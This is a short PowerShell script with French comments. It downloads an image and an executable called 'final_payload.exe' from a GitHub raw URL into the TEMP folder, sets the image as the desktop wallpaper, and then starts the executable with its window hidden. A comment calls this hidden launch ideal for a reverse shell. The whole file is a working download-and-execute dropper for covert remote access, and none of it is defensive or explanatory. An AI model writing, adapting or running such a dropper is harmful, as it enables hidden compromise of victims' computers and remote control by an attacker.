$TempPath = "$env:TEMP"
$PayloadUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/final_payload.exe"
$ImageAnonUrl = "https://raw.githubusercontent.com/FogBound-IT/test/793235c441ddaec513ddb5699b33a2cff3b285aa/thumb-1920-423529.jpg"
$PayloadDest = "$TempPath\pld.exe"
$ImageDest = "$TempPath\anonymous.jpg"

Try {
    Invoke-WebRequest -Uri $ImageAnonUrl -OutFile $ImageDest -ErrorAction Stop
} Catch { Exit 1 }

Try {
    Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadDest -ErrorAction Stop
} Catch { Exit 1 }

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public const int SPI_SETDESKWALLPAPER = 0x0014;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDCHANGE = 0x02;
    public static void SetDesktopWallpaper(string path) {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }
}
"@
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "2"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value "0"
Try {
    [Wallpaper]::SetDesktopWallpaper($ImageDest)
} Catch {}

# s'exécute en arrière-plan sans fenêtre visible, ce qui est idéal pour un reverse shell.
Start-Process -FilePath $PayloadDest -WindowStyle Hidden


# Le script se termine ici.
